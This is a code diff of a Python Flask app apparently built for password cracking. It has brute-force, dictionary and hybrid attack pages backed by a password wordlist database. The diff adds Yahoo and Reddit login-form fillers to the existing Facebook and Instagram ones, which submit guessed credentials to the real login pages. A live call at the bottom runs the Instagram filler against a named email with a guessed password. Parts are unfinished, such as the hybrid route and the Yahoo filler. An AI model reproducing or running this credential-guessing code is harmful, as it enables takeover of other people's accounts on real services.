@@ -1,5 +1,6 @@
 import mechanize
 import sqlite3
+import requests
 from flask import Flask, render_template, request
 app = Flask(__name__)
 @app.errorhandler(500)
@@ -15,17 +16,27 @@ def bruteforce():
 def dictionary():
     con = sqlite3.connect("passwords1.db")
     con.row_factory = sqlite3.Row
-    
     cur = con.cursor()
     cur.execute("select * from PASSWORDS")
-    
     rows = cur.fetchall()
     return render_template('dictionary.html', rows = rows)
 @app.route('/rainbow')
 def rainbow():
     return render_template('rainbow.html')
-@app.route('/hybrid')
-def hybrid():
+@app.route('/passwordstrengthchecker')
+def passwordstrengthchecker():
+    return render_template('passwordstrengthchecker.html')
+@app.route('/hybrid', methods = ['POST', 'GET'])
+def hybrid( ):
+    con = sqlite3.connect("passwords1.db")
+    con.row_factory = sqlite3.Row
+    cur = con.cursor()
+    cur.execute("select * from PASSWORDS")
+    rows = cur.fetchall()
+
+    username = request.form['accusername']
+    charset = request.form['charset']
+    website = request.form['website']
     return render_template('hybrid.html')
 @app.route('/hello')
 def hello():
@@ -67,7 +78,7 @@ def generate(username, charset, length, word):
         if newword != None:
             return newword
     return None
-# methods for the dictionary algorithm 
+# methods for the dictionary algorithm
 @app.route('/run_dictionary', methods = ['POST', 'GET'])
 def dictionary_alg():
     username = request.form["accusername"]
@@ -83,6 +94,11 @@ def dictionary_alg():
     else:
         return render_template('500_bf.html')
 
+@app.route('/run_passwordchecker', methods = ['POST', 'GET'])
+def passwordchecker_alg():
+    return render_template('passwordstrengthchecker.html')
+
+# fill the form for facebook profiles
 def facebook_form_filler(email, password):
     br = mechanize.Browser()
     #br.set_all_readonly(False)    # allow everything to be written to
@@ -95,6 +111,48 @@ def facebook_form_filler(email, password):
     br.form['pass'] = password
     result = br.submit(id='u_0_2')
     return result.geturl() == "https://www.facebook.com/"
+# fill the form for yahoo profiles
+def yahoo_form_filler(email, password):
+    br = mechanize.Browser()
+    br.set_handle_robots(False)   # no robots
+    br.set_handle_refresh(False)  # can sometimes hang without this
+    response = br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=us&.lang=en-US&.done=https%3A%2F%2Fwww.yahoo.com")
+    br.form = list(br.forms())[0]
+    # for control in br.form.controls:
+    #     print(control)
+    #     print("type=%s, name=%s value=%s" % (control.type, control.name, br[control.name]))
+    br.form['username'] = email
+    result = br.submit(id = 'login-signin')
+    print(result)
+    print(result.geturl())
+    response1 = br.open(result.geturl())
+    # br.form = list(br.forms())[0]
+    # for control in br.form.controls:
+    #     print(control)
+    #     print("type=%s, name=%s value=%s" % (control.type, control.name, br[control.name]))
+
+# fill the form for reddit profile
+def reddit_form_filler(email, password):
+    # attempt with requests
+    s = requests.Session()
+    l = s.post('http://reddit.com/login', {'user':email,'passwd':password,'rem':True})
+    r = s.get('http://reddit.com/login')
+    print(r.json())
+    # br = mechanize.Browser()
+    # br.set_handle_robots(False)
+    # br.set_handle_refresh(False)
+    # response = br.open("https://www.reddit.com")
+    # br.form = list(br.forms())[0]
+    #
+    #
+    # # response = br.open("https://www.facebook.com")
+    # # br.form = list(br.forms())[0]
+    # # br.form.set_all_readonly(False)
+    # # br.form['email'] = email
+    # # br.form['pass'] = password
+    # # result = br.submit(id='u_0_2')
+    # # return result.geturl() == "https://www.facebook.com/"
+    #
 def instagram_form_filler(email, password):
     br = mechanize.Browser()
     br.set_handle_robots(False)   # no robots
@@ -119,3 +177,5 @@ def instagram_form_filler(email, password):
 
 #print(facebook_form_filler("tarabite@yahoo.com","ggggggoo"))
 instagram_form_filler("tarabite@yahoo.com","gobuckeyes")
+#print(facebook_form_filler("tarabite@yahoo.com","ggggggoo"))
+#yahoo_form_filler("tarabite@yahoo.com","gobuckeyes")
